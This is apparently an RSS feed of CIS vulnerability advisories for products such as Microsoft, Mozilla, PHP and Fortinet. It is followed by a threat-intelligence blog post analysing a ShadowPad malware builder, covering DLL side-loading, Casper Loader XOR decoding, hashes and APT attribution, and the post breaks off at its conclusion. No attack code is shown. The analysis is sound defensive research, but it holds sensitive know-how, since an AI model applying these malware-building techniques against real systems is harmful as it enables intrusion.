<p>Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights</p>
]]></content:encoded>
<pubDate>Tue, 11 Jun 2024 20:39:20 -0400</pubDate>
</item>
<item>
<title>Critical Patches Issued for Microsoft Products, June 11, 2024</title>
<link>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-june-11-2024_2024-070</link>
<guid>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-june-11-2024_2024-070</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Microsoft products, the most severe of which could allow for remote code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 11 Jun 2024 20:30:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Mozilla Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-069</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-069</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Mozilla products, the most severe of which could allow for arbitrary code execution. Mozilla Firefox is a web browser used to access the Internet. Mozilla Firefox ESR is a version of the web browser intended to be deployed in large organizations. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 11 Jun 2024 20:19:19 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in SolarWinds Serv-U Could Allow for Path Transversal</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-solarwinds-serv-u-could-allow-for-path-transversal_2024-068</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-solarwinds-serv-u-could-allow-for-path-transversal_2024-068</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in SolarWinds Serv-U that could allow for path transversal that could lead to disclosure of sensitive information. SolarWinds Serv-U is a managed file transfer solution used to store and share files across an enterprise network. It can be hosted on both Windows and Linux-based servers. Successful exploitation of this vulnerability could allow for the disclosure of sensitive information in the context of the files and directories. Depending on the permissions associated with the files, an attacker could view content within them. Files with stricter access controls and file permissions could be less impacted than those without.</p>
]]></content:encoded>
<pubDate>Fri, 07 Jun 2024 17:43:54 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in PHP Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-php-could-allow-for-remote-code-execution_2024-067</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-php-could-allow-for-remote-code-execution_2024-067</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in PHP which could allow for remote code execution. PHP is a programming language originally designed for use in web-based applications with HTML content. Successful exploitation could allow for remote code execution in the context of the affected service account. Depending on the privileges associated with the service account an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Service accounts that are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 07 Jun 2024 15:42:16 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Progress Telerik Report Server Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-progress-telerik-report-server-could-allow-for-remote-code-execution_2024-066</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-progress-telerik-report-server-could-allow-for-remote-code-execution_2024-066</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Progress Telerik Report Server, which could allow for remote code execution. Telerik Report Server provides centralized management for Progress’ business intelligence reporting suite through a web application. Successful chain exploitation of these vulnerabilities could allow for remote code execution in the context of the affected service account. Depending on the privileges associated with the service account, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Services whose accounts are configured to have fewer rights on the system could be less impacted than those who operate with administrative rights.</p>
]]></content:encoded>
<pubDate>Tue, 04 Jun 2024 17:30:39 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Check Point Security Gateways Could Allow for Credential Access</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-check-point-security-gateways-could-allow-for-credential-access_2024-065</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-check-point-security-gateways-could-allow-for-credential-access_2024-065</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Check Point Security Gateway Products that could allow for credential access. A Check Point Security Gateway sits between an organization’s environment and the Internet to enforce policy and block threats and malware. Successful exploitation of this vulnerability could allow for credential access to local accounts due to an arbitrary file read vulnerability. Other sensitive files such as SSH keys and certificates may also be read. Depending on the privileges associated with the accounts, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Local accounts that are configured to have fewer rights on the system could be less impacted than those that operate with administrative rights.</p>
]]></content:encoded>
<pubDate>Fri, 31 May 2024 19:16:28 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in LenelS2 NetBox Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-lenels2-netbox-could-allow-for-arbitrary-code-execution_2024-063</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-lenels2-netbox-could-allow-for-arbitrary-code-execution_2024-063</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in LenelS2 NetBox, the most severe of which could allow for arbitrary code execution. LenelS2 NetBox is a browser-based enterprise access control and event monitoring system designed for deployments with demanding security requirements. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the affected user account. Depending on the privileges associated with the user account, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 30 May 2024 20:42:33 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Fortinet FortiSIEM Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-fortinet-fortisiem-could-allow-for-remote-code-execution_2024-062</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-fortinet-fortisiem-could-allow-for-remote-code-execution_2024-062</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Fortinet FortiSIEM which could allow for remote code execution. FortiSIEM is a multi-tenant SIEM that offers real-time infrastructure and user awareness for precise threat detection, analysis, and reporting. Successful exploitation could allow for remote code execution in the context of the affected service account. Depending on the privileges associated with the service account an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Service accounts that are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 29 May 2024 19:59:43 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in SolarWinds Access Rights Manager Could Allow for Privilege Escalation</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-solarwinds-access-rights-manager-could-allow-for-privilege-escalation_2024-057</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-solarwinds-access-rights-manager-could-allow-for-privilege-escalation_2024-057</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in SolarWinds Access Rights Manager that could allow for privilege escalation. Successful exploitation of this vulnerability could allow for privilege escalation in the context of the affected service account. Depending on the privileges associated with the service account, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Service accounts whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 20:43:00 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Mozilla Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-056</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-mozilla-products-could-allow-for-arbitrary-code-execution_2024-056</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Mozilla Products, the most severe of which could allow for arbitrary code execution.</p>
<ul>
<li>Mozilla Firefox is a web browser used to access the Internet. </li>
<li>Mozilla Firefox ESR is a version of the web browser intended to be deployed in large organizations.</li>
<li>Mozilla Thunderbird is an email client.</li>
</ul>
<p>Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 00:10:59 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Siemens Ruggedcom Crossbow Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-siemens-ruggedcom-crossbow-could-allow-for-arbitrary-code-execution_2024-055</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-siemens-ruggedcom-crossbow-could-allow-for-arbitrary-code-execution_2024-055</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Siemens Ruggedcom Crossbow, the most severe of which could allow for arbitrary code execution. Siemens Ruggedcom Crossbow Access Management solution designed to provide cybersecurity compliance for industrial control systems. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged-on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 00:00:17 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Adobe Products Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-054</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-adobe-products-could-allow-for-arbitrary-code-execution_2024-054</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Adobe products, the most severe of which could allow for arbitrary code execution.</p>
<ul>
<li>Adobe Acrobat is a family of application software and Web services used to view, create, manipulate, print and manage Portable Document Format (PDF) files.</li>
<li>Adobe Substance3D Painter is a 3D painting software that allows users to texture and add materials directly to 3D meshes in real-time.</li>
<li>Adobe Substance3D Designer is a 3D design software that generates textures from procedural patterns inside node-based graphs.</li>
<li>Adobe Aero is a cross platform solution that enables creatives with no coding and mininmal 3D experience to design, share, and view interactive augmented reality experiences. </li>
<li>Adobe FrameMaker lets you create structured or template-based documents, review and collaborate with multiple content management systems and publish to a multitude of devices.</li>
<li>Adobe Dreamweaver is a proprietary web development tool.</li>
<li>Adobe Illustrator is a vector graphics editor and design software.</li>
<li>Adobe Animate is used to create vector graphics and interactive content.</li>
</ul>
<p>Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 21:41:52 -0400</pubDate>
</item>
<item>
<title>Critical Patches Issued for Microsoft Products, May 14, 2024</title>
<link>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-may-14-2024_2024-053</link>
<guid>https://www.cisecurity.org/advisory/critical-patches-issued-for-microsoft-products-may-14-2024_2024-053</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Microsoft products, the most severe of which could allow for remote code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 15:10:33 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Apache OFBiz Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-apache-ofbiz-could-allow-for-remote-code-execution_2024-049</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-apache-ofbiz-could-allow-for-remote-code-execution_2024-049</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in the Apache OFBiz, which could allow for remote code execution. Apache OFBiz is an open-source product for the automation of enterprise processes. It includes framework components and business applications for ERP, CRM, E-Business/E-Commerce, Supply Chain Management and Manufacturing Resource Planning. Successful exploitation of this vulnerability could allow for remote code execution in the context of the affected service account. Depending on the privileges associated with the service account, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Services whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 09 May 2024 16:51:10 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in F5 BIG-IP Next Central Manager Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-f5-big-ip-next-central-manager-could-allow-for-remote-code-execution_2024-048</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-f5-big-ip-next-central-manager-could-allow-for-remote-code-execution_2024-048</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in F5 BIG-IP Next Central Manager that could allow for remote code execution. BIG-IP Next Central Manager is the management and application orchestration platform used to control BIG-IP Next instances. It can be installed on dedicated hardware or virtualized through VMware ESXi. Successful exploitation of this vulnerability could allow for Remote Code Execution in the context of the affected service account. Depending on the privileges associated with the service account, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Services accounts that are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 09 May 2024 16:46:48 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Mozilla PDF.js Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-mozilla-pdfjs-could-allow-for-arbitrary-code-execution_2024-046</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-mozilla-pdfjs-could-allow-for-arbitrary-code-execution_2024-046</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Mozilla PDF.js could allow for arbitrary code execution. Mozilla PDF.js is a PDF viewer that is built into Mozilla Firefox and can be used by other web browsers. Exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 07 May 2024 18:24:23 -0400</pubDate>
</item>
<item>
<title>Oracle Quarterly Critical Patches Issued April 16, 2024</title>
<link>https://www.cisecurity.org/advisory/oracle-quarterly-critical-patches-issued-april-16-2024_2024-042</link>
<guid>https://www.cisecurity.org/advisory/oracle-quarterly-critical-patches-issued-april-16-2024_2024-042</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Oracle products, the most severe of which could allow for remote code execution.</p>
]]></content:encoded>
<pubDate>Wed, 17 Apr 2024 19:51:17 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Ivanti Avalanche Could Allow for Remote Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-ivanti-avalanche-could-allow-for-remote-code-execution_2024-041</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-ivanti-avalanche-could-allow-for-remote-code-execution_2024-041</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Ivanti Avalanche, the most severe of which could allow for remote code execution. Ivanti Avalanche is a mobile device management system. Network security features allow one to manage wireless settings (including encryption and authentication), and apply those settings on a schedule throughout the network. Successful exploitation could allow for remote code execution in the context of the system. Depending on the privileges associated with the system, an attacker could then install programs; view, change, or delete data.</p>
]]></content:encoded>
<pubDate>Wed, 17 Apr 2024 16:29:09 -0400</pubDate>
</item>
<item>
<title>Building Casper’s Shadow</title>
<link>http://nao-sec.org/2024/06/building-caspers-shadow.html</link>
<guid>http://nao-sec.org/2024/06/building-caspers-shadow.html</guid>
<content:encoded><![CDATA[
<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/top.png" /></p>

<h2 id="introduction">Introduction</h2>
<p>A few days ago, we came across a peculiar file. It looked like some kind of builder, and a quick glance at the settings piqued our interest. It appeared to be a ShadowPad builder, probably created around 2021.</p>

<p>ShadowPad builders became a topic of conversation around the time of the i-Soon leak, but we had never seen the actual builder ourselves. This is likely true for most of you as well.</p>

<p>We were so intrigued that we carefully investigated this builder and reviewed past attack campaigns. In this article, we will share how attackers build ShadowPad, what we discovered through our investigation, and our insights.</p>

<p>Our investigation is still ongoing. We would love to engage in active discussions with you. If you have any opinions or comments, please feel free to contact us.</p>

<p>[Note] What we discovered this time is a builder. It does not include a controller. Therefore, it is not possible to control what is generated by this builder. In other words, this builder alone is not meaningful in the real world.</p>

<h2 id="background">Background</h2>
<p>In June 2024, we happened to read a research memo from a year ago. We often read past memos for a change of pace. In doing so, we recalled an attack on Kyrgyzstan in April 2023.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/1.png" /></p>

<p><a href="https://x.com/nao_sec/status/1648960199938707456">https://x.com/nao_sec/status/1648960199938707456</a></p>

<p>This attack involved a file resembling a RoyalRoad RTF, which prompted our investigation at the time. Opening this RTF file with a vulnerable version of Microsoft Word displayed a decoy file related to Kyrgyzstan’s cybersecurity, while simultaneously writing and executing several files to the disk. As a result, a CobaltStrike beacon was executed.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/2.png" /></p>

<p>The loader that decrypted and executed the beacon resembled Casper Loader. Casper Loader is familiar to threat researchers specializing in East Asia and has been reported to be used in attacks by Tick<sup id="fnref:1"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:1" rel="footnote">1</a></sup><sup id="fnref:2"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:2" rel="footnote">2</a></sup>. Our friend @aRtAGGI conducted similar analyses at the time.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/3.png" /></p>

<p><a href="https://x.com/aRtAGGI/status/1649184131090087938">https://x.com/aRtAGGI/status/1649184131090087938</a></p>

<p>We later found that a similar attack had been carried out against Kazakhstan after searching our past database. The attack on Kazakhstan was older than the one on Kyrgyzstan, occurring around November 2022. In this case, the same loader executed from the RTF file eventually ran the CobaltStrike beacon.</p>

<p>Information about the RTF files used in the attacks on Kyrgyzstan and Kazakhstan is listed in the IoC sheet from our previous research on RoyalRoad RTF<sup id="fnref:3"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:3" rel="footnote">3</a></sup><sup id="fnref:4"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:4" rel="footnote">4</a></sup>. We have identified these as <code class="language-plaintext highlighter-rouge">U-4</code>. If you are interested, please refer to the IoC sheet.</p>

<p><a href="https://nao-sec.org/jsac2020_ioc.html">https://nao-sec.org/jsac2020_ioc.html</a></p>

<p>Let’s return to the present. To investigate recent attack samples, we executed a search query based on the characteristics of the loader used in the attack on Kyrgyzstan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exports:IEE2 exports:LoadLibraryShim2 exports:LoadStringRC2
</code></pre></div></div>

<p>We found an unusual file posted in May 2024. This data was embedded in the resource section of another file. We downloaded and executed the original file. To our surprise, it was a ShadowPad builder.</p>

<h2 id="caspervmakerhttpx86">CasperVMakerHTTPx86</h2>

<table>
  <tbody>
    <tr>
      <td>MD5</td>
      <td>eb99580e0d90ee61b3e2e3bd8715c633</td>
    </tr>
    <tr>
      <td>SHA-1</td>
      <td>706482eda6d747ca2688cdfd97399f800da9e73c</td>
    </tr>
    <tr>
      <td>SHA-256</td>
      <td>b6d7c456423c871c7ffe418069a75c39055e4e3d023021c8b0885a02c7ce93c6</td>
    </tr>
  </tbody>
</table>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/5.png" /></p>

<p>When launching the ShadowPad builder, which calls itself CasperVMakerHTTPx86, the following screen appears. There are several tabs, each with various settings.</p>

<ul>
  <li>First</li>
  <li>Install</li>
  <li>Inject</li>
  <li>Online</li>
  <li>Proxy</li>
  <li>DNS</li>
</ul>

<p>These items are very similar to the reported architecture of ShadowPad<sup id="fnref:5"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:5" rel="footnote">5</a></sup>. This suggests that these tabs are configuration items for each module. The settings for each item are as follows:</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/6.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/7.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/8.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/9.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/10.png" /></p>

<p>Let’s try building ShadowPad. By clicking the “Build EXE x86” button, ShadowPad is generated. If the build is successful, an EXE file and a DLL file are created.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/11.png" /></p>

<p>The EXE file is a legitimate AppLaunch. It loads the mscoree.dll in the same directory via DLL Side-Loading. The DLL file is the Casper Loader, which decodes and executes the ShadowPad shellcode stored internally.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/12.png" /></p>

<h2 id="comparison-with-similar-samples">Comparison with Similar Samples</h2>
<p>ShadowPad loaders exhibit several patterns, but those generated using this builder are decoded using a custom XOR with constants.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/13.png" /></p>

<p>There are many samples with similar characteristics, but we will introduce two of them.</p>

<h3 id="sample-1">Sample-1</h3>
<p>According to Macnica’s report<sup id="fnref:2:1"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:2" rel="footnote">2</a></sup>, Tick uses Casper Loader to execute ShadowPad. Comparing this Casper Loader with the loader created using the builder reveals that while the Macnica sample contains junk code and different fixed values, the algorithm is the same.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/14.png" /></p>

<h3 id="sample-2">Sample-2</h3>
<p>A report released by the FBI in December 2021<sup id="fnref:6"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:6" rel="footnote">6</a></sup> reported an attack exploiting CVE-2021-44515 where ShadowPad was used. The AppLaunch.exe and mscoree.dll in this case used Casper Loader to execute ShadowPad.</p>

<p>Comparing this Casper Loader with the one created using the builder shows that the algorithm and fixed values are identical. Although API Hashing is not used, it is a highly similar sample.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/15.png" /></p>

<h2 id="shadowpad-community">ShadowPad Community</h2>
<p>As you know, ShadowPad is commercial software sold for profit. According to SentinelOne’s report from 2021<sup id="fnref:5:1"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:5" rel="footnote">5</a></sup>, ShadowPad is sold to various targeted attack groups, and there is speculation that whg and Rose are involved in its development. The i-Soon leak in February 2024 reported that i-Soon was selling software that appeared to be ShadowPad (including source code and training)<sup id="fnref:7"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:7" rel="footnote">7</a></sup>.</p>

<p>As various researchers have reported<sup id="fnref:2:2"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:2" rel="footnote">2</a></sup><sup id="fnref:5:2"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:5" rel="footnote">5</a></sup><sup id="fnref:6:1"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:6" rel="footnote">6</a></sup><sup id="fnref:8"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:8" rel="footnote">8</a></sup><sup id="fnref:9"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:9" rel="footnote">9</a></sup><sup id="fnref:10"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:10" rel="footnote">10</a></sup><sup id="fnref:11"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:11" rel="footnote">11</a></sup><sup id="fnref:12"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:12" rel="footnote">12</a></sup><sup id="fnref:13"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:13" rel="footnote">13</a></sup><sup id="fnref:14"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:14" rel="footnote">14</a></sup><sup id="fnref:15"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:15" rel="footnote">15</a></sup><sup id="fnref:16"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:16" rel="footnote">16</a></sup><sup id="fnref:17"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:17" rel="footnote">17</a></sup><sup id="fnref:18"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:18" rel="footnote">18</a></sup><sup id="fnref:19"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:19" rel="footnote">19</a></sup><sup id="fnref:20"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:20" rel="footnote">20</a></sup><sup id="fnref:21"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:21" rel="footnote">21</a></sup><sup id="fnref:22"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:22" rel="footnote">22</a></sup><sup id="fnref:23"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:23" rel="footnote">23</a></sup><sup id="fnref:24"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:24" rel="footnote">24</a></sup><sup id="fnref:25"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:25" rel="footnote">25</a></sup><sup id="fnref:26"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:26" rel="footnote">26</a></sup><sup id="fnref:27"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:27" rel="footnote">27</a></sup><sup id="fnref:28"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:28" rel="footnote">28</a></sup><sup id="fnref:29"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:29" rel="footnote">29</a></sup><sup id="fnref:30"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:30" rel="footnote">30</a></sup><sup id="fnref:31"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:31" rel="footnote">31</a></sup><sup id="fnref:32"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:32" rel="footnote">32</a></sup><sup id="fnref:33"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:33" rel="footnote">33</a></sup><sup id="fnref:34"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:34" rel="footnote">34</a></sup><sup id="fnref:35"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:35" rel="footnote">35</a></sup><sup id="fnref:36"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:36" rel="footnote">36</a></sup><sup id="fnref:37"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:37" rel="footnote">37</a></sup><sup id="fnref:38"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:38" rel="footnote">38</a></sup>, many targeted attack groups use ShadowPad. These can be broadly categorized into two groups: attack groups associated with the MSS, like APT41, and those associated with the PLA, like Tick.</p>

<p>As previously mentioned, it is generally believed that whg and Rose were involved in ShadowPad’s development. There is no compelling reason to refute this, so we will proceed with this assumption. According to a U.S. government report related to APT41<sup id="fnref:39"><a class="footnote" href="http://nao-sec.org/2024/06/building-caspers-shadow.html#fn:39" rel="footnote">39</a></sup>, Rose (Tan Dailin) was involved in APT41. Seven individuals were indicted for their involvement with APT41, with Rose (and Zhang Haoran) being particularly noted for their involvement in both BARIUM and LEAD, making them key figures in APT41’s activities. This background suggests that BARIUM was the earliest adopter of ShadowPad, followed by LEAD.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/16.png" /></p>

<p>In contrast, the PLA has many more attack groups using ShadowPad than the MSS. This is generally because many researchers have given them different names, and their relationships are not sufficiently organized. If you are a researcher, you probably have more organized information in your mind (or within your organization). Of course, we understand and accept this. However, to keep things simple, we will exclude such discussions in this article and share how we organized this information within nao_sec. Interestingly, all these attack groups used the RoyalRoad RTF Weaponizer. Is this just a coincidence? ShadowPad and RoyalRoad RTF Weaponizer may be shared through the same channels.</p>

<p><img alt="" src="https://nao-sec.org/assets/2024-07-01/17.png" /></p>

<h2 id="conclusion">Conclusion</h2>
